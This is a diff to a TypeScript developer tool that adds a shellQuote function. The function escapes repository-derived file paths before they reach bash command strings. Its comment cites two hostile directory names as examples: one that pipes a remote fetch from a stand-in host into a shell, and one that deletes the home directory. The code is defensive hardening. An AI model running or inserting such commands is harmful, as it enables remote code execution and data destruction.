@@ -71,6 +71,25 @@ export const WINDOWS_SHELL_HELP =
   "Native Windows isn't fully supported yet: devhelp's install commands need a " +
   "bash-compatible shell. Run it under WSL (recommended) or Git Bash.";
 
+/**
+ * Quote a value for safe interpolation into a POSIX shell command.
+ *
+ * Repo-derived file paths (Prisma schema paths, docker-compose filenames, env
+ * templates) get embedded into the `bash -lc` strings devhelp runs. A cloned
+ * repo can name a directory `$(curl evil|sh)` or `; rm -rf ~`, so those paths
+ * are attacker-controlled and must never reach the shell raw.
+ *
+ * Values that are already a plain filename/path token (alphanumerics plus
+ * `. _ - /`) pass through unquoted so common paths stay readable in the panel.
+ * Anything else — spaces, `$()`, backticks, `;`, redirections — is wrapped in
+ * single quotes (with embedded single-quotes escaped as '\''), which disables
+ * all shell expansion. An empty string becomes '' (a valid empty argument).
+ */
+export function shellQuote(s: string): string {
+  if (s !== "" && /^[A-Za-z0-9._/-]+$/.test(s)) return s;
+  return `'${s.replace(/'/g, `'\\''`)}'`;
+}
+
 /** Returns the system package manager on this machine, or null if none found. */
 export async function detectSystemPackageManager(): Promise<SystemPkgManager | null> {
   // On macOS, brew is the only one devhelp drives. Don't probe Linux managers.
